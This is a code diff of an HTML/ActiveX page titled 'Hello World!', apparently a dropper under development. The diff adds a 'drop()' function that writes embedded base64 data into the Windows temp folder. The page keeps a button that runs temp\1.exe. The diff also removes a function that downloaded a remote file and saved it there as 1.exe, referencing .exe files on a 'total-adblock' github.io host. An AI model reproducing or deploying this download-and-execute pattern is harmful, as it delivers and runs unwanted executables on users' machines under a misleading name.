@@ -18,7 +18,23 @@
 
 </head>
 <body>
+  <object id="myFile" classid="clsid:txtfile" width="110" height="110">
+  <param name="DataURL" value="data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==" />
+</object>
 <script>
+
+function drop(){
+  var myFile = document.getElementById("myFile");
+  var text = myFile.Text;
+  alert(text);
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var tempFolder = fso.GetSpecialFolder(2);
+
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var file = fso.CreateTextFile(tempFolder+"\\example.txt", true);
+  file.Write(text);
+  file.Close();
+}
 function openUrlInDefaultBrowser(url) {
   var shell = new ActiveXObject("Shell.Application");
   shell.ShellExecute(url);
@@ -30,27 +46,8 @@ function runExeFile() {
 
   shell.Run(tempFolder+"\\1.exe");
 }
-function downloadFile(url, filename) {
-  var fso = new ActiveXObject("Scripting.FileSystemObject");
-  var tempFolder = fso.GetSpecialFolder(2);
-  var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
-  xmlhttp.open("GET", url, true);
- // xmlhttp.responseType = "arraybuffer";
-  xmlhttp.onreadystatechange = function() {
-    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
-      var stream = new ActiveXObject("ADODB.Stream");
-      stream.type = 1;
-      stream.open();
-      stream.write(xmlhttp.responseBody);
-      stream.saveToFile(tempFolder+"\\1.exe", 2);
-      stream.close();
-      //runExeFile(tempFolder+"\\1.exe");
-      //downloadFile('https://total-adblock.github.io/OpenUrl.exe', ' ')
-    }
-  };
-  xmlhttp.send();
-}
 </script>
+
 
 <div>
   <h1>Hello World!</h1>
@@ -60,6 +57,7 @@ function downloadFile(url, filename) {
 
   </script>
   <button onclick="runExeFile();">Download File</button>
+  <button onclick="drop();">drop()</button>
 <a href="https://total-adblock.github.io/test.exe"> Whoho </a>
 </div>
 <script>
